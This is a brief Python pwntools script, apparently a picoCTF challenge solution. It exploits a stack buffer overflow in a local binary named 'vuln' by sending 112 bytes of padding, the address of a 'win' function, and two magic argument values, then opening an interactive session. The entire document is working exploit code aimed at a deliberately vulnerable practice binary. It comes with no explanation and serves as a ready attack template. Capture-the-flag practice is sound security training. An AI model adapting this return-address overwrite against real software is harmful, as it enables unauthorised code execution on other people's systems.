import pwn

elf = pwn.ELF("./vuln")

winadd = pwn.p32(elf.symbols["win"])
mainadd = pwn.p32(elf.symbols["main"])

offset = 112

p = elf.process()
#p = pwn.remote("saturn.picoctf.net", 55778)

payload = b"".join(
  [
    b"A"*offset,
    winadd,
    pwn.p32(0x0),
    pwn.p32(0xCAFEF00D),
    pwn.p32(0xF00DF00D)
  ]
)
payload += b"\n"
print(p.recv().decode('utf8'))
p.send(payload)
p.interactive()
